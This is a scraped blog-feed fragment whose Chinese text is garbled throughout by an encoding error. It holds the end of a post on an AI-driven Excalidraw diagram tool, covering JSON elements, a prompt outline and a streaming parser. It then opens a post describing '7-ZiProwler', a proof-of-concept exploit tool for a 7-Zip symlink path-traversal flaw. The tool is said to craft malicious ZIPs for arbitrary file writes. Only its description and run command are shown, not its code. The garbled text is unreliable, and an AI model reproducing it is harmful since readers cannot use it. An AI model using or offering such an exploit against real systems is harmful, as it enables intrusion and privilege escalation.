<p>Excalidraw çš„ç»˜å›¾åŸç†æ˜¯é€šè¿‡ JSON æè¿°å…ƒç´ ã€‚æ¯ä¸ªå…ƒç´ æœ‰ <code>id</code>ã€<code>type</code>ã€<code>x</code>ã€<code>y</code>ã€<code>width</code>ã€<code>height</code> è¿™äº›åŸºç¡€å±æ€§ï¼Œä¸åŒç±»å‹è¿˜æœ‰ç‰¹å®šå±æ€§ã€‚</p>
<p>æ”¯æŒçš„å…ƒç´ ç±»å‹ï¼š</p>








































<table><thead><tr><th>ç±»å‹</th><th>è¯´æ˜</th><th>ç‰¹æœ‰å±æ€§</th></tr></thead><tbody><tr><td><code>rectangle</code></td><td>çŸ©å½¢</td><td>-</td></tr><tr><td><code>ellipse</code></td><td>æ¤­åœ†</td><td>-</td></tr><tr><td><code>diamond</code></td><td>è±å½¢</td><td>-</td></tr><tr><td><code>text</code></td><td>æ–‡æœ¬</td><td><code>text</code>, <code>fontSize</code>, <code>fontFamily</code></td></tr><tr><td><code>arrow</code></td><td>ç®­å¤´</td><td><code>points</code>, <code>endArrowhead</code></td></tr><tr><td><code>line</code></td><td>çº¿æ¡</td><td><code>points</code></td></tr></tbody></table>
<p>ä¸€ä¸ªç®€å•çš„çŸ©å½¢å…ƒç´ ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"excalidraw"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"source"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://excalidraw.com"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"elements"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rect-1"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rectangle"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"width"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">150</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"height"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">80</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"backgroundColor"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#a5d8ff"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"strokeColor"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#1971c2"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>backgroundColor æ˜¯çŸ©å½¢çš„é¢œè‰²ï¼ŒstrokeColor æ˜¯è¾¹æ¡†é¢œè‰²ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/027a27df1b454c0a9e3138cc3c8a8f74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=u7%2Fs5rBBr5Q4WvhQYNjldYahSwo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">äºŒã€AI æç¤ºè¯è®¾è®¡</h4>
<p>ä¸ºäº†è®© AI ç”Ÿæˆæ­£ç¡®çš„ JSON åŒæ—¶ä¿è¯å‡ºå›¾çš„æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ç»™ AI æä¾›ä¸€äº›å¿…è¦çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>è¾“å‡ºæ ¼å¼ï¼šçº¯ JSONï¼Œä¸è¦ä»£ç å—ï¼ˆæ–¹ä¾¿æµå¼è§£æï¼‰</li>
<li>æ–‡å­—å¤„ç†ï¼šä¸­è‹±æ–‡å®½åº¦è®¡ç®—è§„åˆ™ï¼Œå½¢çŠ¶å†…æ–‡å­—çš„åŒå‘ç»‘å®š</li>
<li>ç®­å¤´è§„èŒƒï¼š<code>points</code> æ˜¯ç›¸å¯¹åæ ‡ï¼Œå„æ–¹å‘ç®­å¤´çš„å†™æ³•</li>
<li>å¸¸ç”¨é¢œè‰²ï¼šExcalidraw å†…ç½®è°ƒè‰²æ¿</li>
</ul>
<p>æˆ‘çš„ prompt ç»“æ„å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œä»…ä¾›å‚è€ƒï¼š</p>
<pre><code class="hljs language-plain" lang="plain">ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ Excalidraw ç»˜å›¾åŠ©æ‰‹ã€‚ç”¨æˆ·ä¼šæè¿°ä»–ä»¬æƒ³è¦ç»˜åˆ¶çš„å›¾å½¢ã€æµç¨‹å›¾ã€æ¶æ„å›¾ç­‰ï¼Œä½ éœ€è¦ç”Ÿæˆå¯¹åº”çš„ Excalidraw å…ƒç´  JSONã€‚
## è¾“å‡ºæ ¼å¼è¦æ±‚
1. **å…ˆè¯´æ˜ï¼Œåè¾“å‡º**ï¼šå…ˆç®€è¦è¯´æ˜è¦ç”»ä»€ä¹ˆï¼Œç„¶åè¿ç»­è¾“å‡ºæ‰€æœ‰ JSON å…ƒç´ 
2. **ç¦æ­¢**åœ¨ JSON å…ƒç´ ä¹‹é—´ç©¿æ’è¯´æ˜æ–‡å­—
3. æ¯ä¸ªå…ƒç´ ç›´æ¥è¾“å‡ºçº¯ JSON å¯¹è±¡ï¼Œä»¥ { å¼€å¤´ï¼Œä»¥ } ç»“å°¾
4. **ç¦æ­¢**ä½¿ç”¨ä»£ç å—ï¼ˆç¦æ­¢ \`\`\` ç¬¦å·ï¼‰
5. **å¿…é¡»**ä½¿ç”¨æ ‡å‡† JSON æ ¼å¼ï¼šé”®å€¼å¯¹ç”¨å†’å·åˆ†éš”ï¼ˆå¦‚ "x":100ï¼‰ï¼Œä¸è¦å†™æˆç­‰å·
## æ–‡å­—å¤„ç†
## ç®­å¤´å’Œçº¿æ¡
## å…ƒç´ åŸºç¡€ç»“æ„
## åŸºç¡€å½¢çŠ¶
## å¸¸ç”¨é¢œè‰²
</code></pre>
<p>å› ä¸ºå®åœ¨æ˜¯å¤ªé•¿äº†ï¼Œä¸ºäº†ä¸å½±å“æ–‡ç« çš„ç¯‡å¹…æˆ‘å°±çœç•¥äº†ä¸€äº›å†…å®¹ï¼Œå¤§å®¶éœ€è¦å®Œæ•´å†…å®¹çš„è¯å¯ä»¥è”ç³»æˆ‘ã€‚</p>
<h4 data-id="heading-7">ä¸‰ã€æµå¼ JSON è§£æ</h4>
<p>AI è¿”å›çš„å†…å®¹æ˜¯æµå¼çš„ï¼Œéœ€è¦è¾¹æ¥æ”¶è¾¹è§£æã€‚æ ¸å¿ƒè§£æé€»è¾‘ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä»æµå¼æ–‡æœ¬ä¸­æå–å®Œæ•´çš„ JSON å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">extractJsonObjects</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> results = []
  <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>
  
  <span class="hljs-keyword">while</span> (i &lt; text.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">const</span> startIndex = text.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'{'</span>, i)
    <span class="hljs-keyword">if</span> (startIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>
    
    <span class="hljs-comment">// è¿½è¸ªèŠ±æ‹¬å·æ·±åº¦ï¼Œå¤„ç†åµŒå¥—</span>
    <span class="hljs-keyword">let</span> depth = <span class="hljs-number">0</span>
    <span class="hljs-keyword">let</span> inString = <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = startIndex; j &lt; text.<span class="hljs-property">length</span>; j++) {
      <span class="hljs-comment">// ... å¤„ç†è½¬ä¹‰å­—ç¬¦å’Œå­—ç¬¦ä¸²</span>
      <span class="hljs-keyword">if</span> (char === <span class="hljs-string">'{'</span>) depth++
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (char === <span class="hljs-string">'}'</span>) {
        depth--
        <span class="hljs-keyword">if</span> (depth === <span class="hljs-number">0</span>) {
          <span class="hljs-comment">// æ‰¾åˆ°å®Œæ•´çš„ JSON å¯¹è±¡</span>
          results.<span class="hljs-title function_">push</span>(text.<span class="hljs-title function_">slice</span>(startIndex, j + <span class="hljs-number">1</span>))
          <span class="hljs-keyword">break</span>
        }
      }
    }
  }
  <span class="hljs-keyword">return</span> results
}
</code></pre>
<p>è¿™é‡Œæœ‰ä¸‰ä¸ªå…³é”®ç‚¹ï¼š</p>
<p>1ï¼‰è¿½è¸ªèŠ±æ‹¬å·æ·±åº¦æ¥å¤„ç†åµŒå¥— JSON</p>
<p>2ï¼‰æ­£ç¡®å¤„ç†å­—ç¬¦ä¸²å†…çš„èŠ±æ‹¬å·ï¼ˆé¿å…è¯¯åˆ¤ï¼‰</p>
<p>3ï¼‰è®°å½•å·²å¤„ç†ä½ç½®ï¼Œé¿å…é‡å¤è§£æ</p>
<p>å½“ç„¶ï¼Œå¯èƒ½è¿˜æœ‰ä¸€äº›æˆ‘æ²¡æƒ³åˆ°çš„æƒ…å†µï¼Œé‡åˆ°çš„è¯æŒ‰éœ€å¤„ç†å³å¯ã€‚</p>
<h4 data-id="heading-8">å››ã€å®æ—¶æ¸²æŸ“</h4>
<p>è§£æå‡ºå…ƒç´ åï¼Œé€šè¿‡ Excalidraw API æ·»åŠ åˆ°ç”»å¸ƒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æš´éœ²ç»™çˆ¶ç»„ä»¶çš„æ–¹æ³•</span>
<span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-attr">addElements</span>: <span class="hljs-function">(<span class="hljs-params">newElements</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> api = excalidrawAPIRef.<span class="hljs-property">current</span>
    <span class="hljs-keyword">const</span> currentElements = api.<span class="hljs-title function_">getSceneElements</span>()
    
    <span class="hljs-comment">// å¤„ç† id å†²çª</span>
    <span class="hljs-keyword">const</span> elementsToAdd = newElements.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (existingIds.<span class="hljs-title function_">has</span>(el.<span class="hljs-property">id</span>)) {
        <span class="hljs-keyword">return</span> { ...el, <span class="hljs-attr">id</span>: <span class="hljs-title function_">generateNewId</span>() }
      }
      <span class="hljs-keyword">return</span> el
    })
    
    <span class="hljs-comment">// æ›´æ–°ç”»å¸ƒ</span>
    api.<span class="hljs-title function_">updateScene</span>({
      <span class="hljs-attr">elements</span>: [...currentElements, ...elementsToAdd],
    })
  },
}))
</code></pre>
<p>åˆ°è¿™ä¸€æ­¥æ ¸å¿ƒæµç¨‹å°±å®Œæˆäº†ï¼Œä¸è¿‡ä¸ºäº†ç¨³å®šæ€§è€ƒè™‘ï¼Œè¿˜å¯ä»¥è¿›è¡Œä¸‹é¢çš„ç¬¬äº”æ­¥å¤„ç†ã€‚</p>
<h4 data-id="heading-9">äº”ã€å…ƒç´ é»˜è®¤å€¼è¡¥å…¨</h4>
<p>AI å¯èƒ½åªç”Ÿæˆå¿…è¦å­—æ®µï¼Œéœ€è¦è¡¥å…¨ Excalidraw éœ€è¦çš„å…¶ä»–å­—æ®µï¼Œä¹Ÿç®—æ˜¯ä¸€ç§é™çº§ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getDefaultElementProps</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">angle</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">strokeColor</span>: <span class="hljs-string">'#1e1e1e'</span>,
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span>,
    <span class="hljs-attr">fillStyle</span>: <span class="hljs-string">'solid'</span>,
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">2</span>,
    <span class="hljs-attr">roughness</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">// æ‰‹ç»˜ç²—ç³™åº¦</span>
    <span class="hljs-attr">opacity</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">seed</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100000</span>, <span class="hljs-comment">// éšæœºç§å­ï¼Œäº§ç”Ÿæ‰‹ç»˜æ•ˆæœ</span>
    <span class="hljs-attr">version</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">versionNonce</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000000000</span>,
    <span class="hljs-attr">isDeleted</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">groupIds</span>: [],
    <span class="hljs-attr">boundElements</span>: <span class="hljs-literal">null</span>,
  }
}
</code></pre>
<h3 data-id="heading-10">ç§»åŠ¨ç«¯é€‚é…</h3>
<p>ä¸ºäº†åœ¨æ‰‹æœºä¸Šä¹Ÿèƒ½ä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œæˆ‘è¿˜åšäº†ç§»åŠ¨ç«¯çš„é€‚é…ï¼Œæ ¸å¿ƒéœ€æ±‚æ˜¯ èƒ½ç”¨AIç”Ÿæˆå¹¶çœ‹åˆ°æ•ˆæœï¼Œç¼–è¾‘ä¹‹ç±»çš„æ“ä½œåœ¨ç§»åŠ¨ç«¯å°±ä¸å¥¢æ±‚äº†ã€‚ç§»åŠ¨ç«¯é‡‡ç”¨ä¸Šä¸‹å¸ƒå±€ï¼Œå³ä¸Šé¢çš„ç”»å¸ƒ + åº•éƒ¨è¾“å…¥æ¡†ï¼š<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b98db17b090498dae7453a4561dbeb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2_mnb7mn48=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767588404&amp;x-signature=bbhR%2BP7t0qoYt1U2c815v5Wm2xQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">æ•°æ®æŒä¹…åŒ–</h3>
<p>è¿™ä¸ªå·¥å…·æ‰€æœ‰çš„ç”»å¸ƒæ•°æ®éƒ½ä¿å­˜åœ¨ <code>localStorage</code> é‡Œï¼Œä¸ä¼šä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæ‰€ä»¥å¤§å®¶å¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚</p>
<h2 data-id="heading-12">ğŸ¯ç»“è¯­</h2>
<p>ä»¥ä¸Šå°±æ˜¯ AI + Excalidraw å®ç°æ‰‹ç»˜é£æ ¼ç»˜å›¾å·¥å…·çš„å®Œæ•´å®ç°å•¦ï¼Œæ ¸å¿ƒå°±æ˜¯è®© AI ç”Ÿæˆç¬¦åˆè§„èŒƒçš„ JSONï¼Œç„¶åæµå¼è§£æå¹¶å®æ—¶æ¸²æŸ“ã€‚</p>
<p>è‡³äºæ•ˆæœçš„è¯ï¼Œæˆ‘åªèƒ½è¯´â€œæµç¨‹æ˜¯é€šçš„ï¼Œæ•ˆæœæ˜¯æ‹‰èƒ¯çš„â€ï¼Œå“ˆå“ˆå“ˆï¼Œæ‰€ä»¥ç›®å‰è¿™ä¸ªé˜¶æ®µåªé€‚åˆä½œä¸ºç©å…·ç©ä¸€ç©ï¼Œè¿œè¿œä¸å¤Ÿç”Ÿäº§çš„æ°´å¹³ï¼Œå¤§å®¶æ„Ÿå…´è¶£çš„è¯å¯ä»¥åˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lzkz.top%2Ftool%2Fexcalidraw" target="_blank" title="https://www.lzkz.top/tool/excalidraw" ref="nofollow noopener noreferrer">www.lzkz.top/tool/excaliâ€¦</a> ç›´æ¥ä½“éªŒã€‚</p>
<p>ä¸è¿‡å› ä¸ºè¿™ä¸ªå·¥å…·å†™åœ¨äº†æˆ‘çš„ä¸ªäººå·¥å…·é‡Œï¼Œæ‰€ä»¥æš‚æ—¶æ²¡æœ‰å¼€æºï¼Œå¤§å®¶éœ€è¦çš„è¯å¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€æˆ–è€…ç›´æ¥è”ç³»æˆ‘ï¼</p>
<p>å¦‚æœæœ‰ç”¨çš„è¯ï¼Œæ¬¢è¿å…³æ³¨ç‚¹èµä¸€èµ·äº¤æµè¿›æ­¥ï¼ä¸‹æœŸå†è§ï¼Œæ‹œæ‹œğŸ‘‹ğŸ»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[7-ZiProwlerï¼šCVE-2025-11001 æ¼æ´åˆ©ç”¨å·¥å…·]]></title>    <link>https://juejin.cn/post/7588837042012946458</link>    <guid>https://juejin.cn/post/7588837042012946458</guid>    <pubDate>2025-12-29T05:32:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588837042012946458" data-draft-id="7588799600165863434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="7-ZiProwlerï¼šCVE-2025-11001 æ¼æ´åˆ©ç”¨å·¥å…·"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2025-12-29T05:32:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            7-ZiProwlerï¼šCVE-2025-11001 æ¼æ´åˆ©ç”¨å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:32:15.000Z" title="Mon Dec 29 2025 05:32:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h2>
<p><strong>7-ZiProwler (CVE-2025-11001)</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªé’ˆå¯¹CVE-2025-11001æ¼æ´ï¼ˆ7-Zipè·¯å¾„éå†æ¼æ´ï¼‰ç¼–å†™çš„æ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰åˆ©ç”¨å·¥å…·ã€‚è¯¥æ¼æ´æºäº7-Zipï¼ˆ25.00ç‰ˆæœ¬ä¹‹å‰ï¼‰åœ¨Windowsç³»ç»Ÿä¸Šå¤„ç†åŒ…å«Linuxé£æ ¼ç¬¦å·é“¾æ¥çš„ZIPå‹ç¼©åŒ…æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´å®ç°ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æƒé™æå‡æˆ–ç³»ç»Ÿè¢«æ§åˆ¶ã€‚</p>
<p>æœ¬é¡¹ç›®ä½¿ç”¨Pythonç¼–å†™ï¼Œé€šè¿‡æ„é€ åŒ…å«æ¶æ„ç¬¦å·é“¾æ¥çš„ZIPæ–‡ä»¶æ¥æ¼”ç¤ºè¯¥æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ã€‚<strong>é‡è¦æç¤ºï¼šè¯·ä»…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨æ­¤å·¥å…·ã€‚</strong></p>
<h2 data-id="heading-1">åŠŸèƒ½ç‰¹æ€§</h2>
<ul>
<li><strong>æ¼æ´åˆ©ç”¨è‡ªåŠ¨åŒ–</strong>ï¼šæ ¹æ®é…ç½®æ–‡ä»¶è‡ªåŠ¨ç”ŸæˆåŒ…å«æ¶æ„ç¬¦å·é“¾æ¥çš„ZIPå‹ç¼©åŒ…ã€‚</li>
<li><strong>æ¨¡æ‹ŸçœŸå®åœºæ™¯</strong>ï¼šåœ¨ZIPåŒ…ä¸­åˆ›å»ºä¸€ä¸ªéšè—çš„<code>.zip</code>æ–‡ä»¶å¤¹æ¥å­˜æ”¾ç¬¦å·é“¾æ¥ï¼Œæ¨¡æ‹Ÿå¯èƒ½çš„æ”»å‡»è½½è·ã€‚</li>
<li><strong>çµæ´»çš„é…ç½®</strong>ï¼šé€šè¿‡TOMLé…ç½®æ–‡ä»¶è½»æ¾æŒ‡å®šç›®æ ‡ç›®å½•ã€æºæ–‡ä»¶ç›®å½•ã€è½½è·æ–‡ä»¶ä»¥åŠè¾“å‡ºæ–‡ä»¶è·¯å¾„ã€‚</li>
<li><strong>è¯¦ç»†çš„æ—¥å¿—è®°å½•</strong>ï¼šæ‰§è¡Œè¿‡ç¨‹ä¸­æä¾›æ¸…æ™°çš„ä¿¡æ¯è¾“å‡ºï¼Œä¾¿äºè·Ÿè¸ªå·¥å…·çš„æ‰§è¡ŒçŠ¶æ€ã€‚</li>
<li><strong>éµå¾ªæ¼æ´åŸç†</strong>ï¼šä¸¥æ ¼éµå¾ªCVE-2025-11001çš„æ¼æ´æˆå› ï¼Œå³åˆ©ç”¨ç›¸å¯¹è·¯å¾„å¤„ç†ä¸å½“å¯¼è‡´çš„ç›®å½•éå†ã€‚</li>
</ul>
<h2 data-id="heading-2">å®‰è£…æŒ‡å—</h2>
<h3 data-id="heading-3">å‰ææ¡ä»¶</h3>
<ul>
<li><strong>Python 3.x</strong></li>
<li><strong>åŒ…ç®¡ç†å·¥å…·</strong>ï¼šæ¨èä½¿ç”¨ <code>uv</code> æˆ– <code>pip</code>ã€‚</li>
</ul>
<h3 data-id="heading-4">ä¾èµ–å®‰è£…</h3>
<p>é¡¹ç›®ä¾èµ–åœ¨ä»£ç ä¸­å¯è§ï¼Œä¸»è¦æ˜¯æ ‡å‡†åº“å’Œ <code>toml</code> åº“ã€‚Python 3.11åŠä»¥ä¸Šç‰ˆæœ¬çš„æ ‡å‡†åº“å·²åŒ…å« <code>toml</code> åº“ï¼ˆ<code>tomllib</code>ï¼‰ã€‚å¦‚æœä½¿ç”¨è¾ƒæ—©çš„Pythonç‰ˆæœ¬ï¼Œå¯èƒ½éœ€è¦å®‰è£… <code>toml</code>ã€‚</p>
<p>ä½¿ç”¨ <code>uv</code>ï¼ˆé¡¹ç›®æ¨èï¼‰å®‰è£…è¿è¡Œç¯å¢ƒï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®ä¿å·²å®‰è£…uv (https://docs.astral.sh/uv/)</span>
uv run src/main.py
</code></pre>
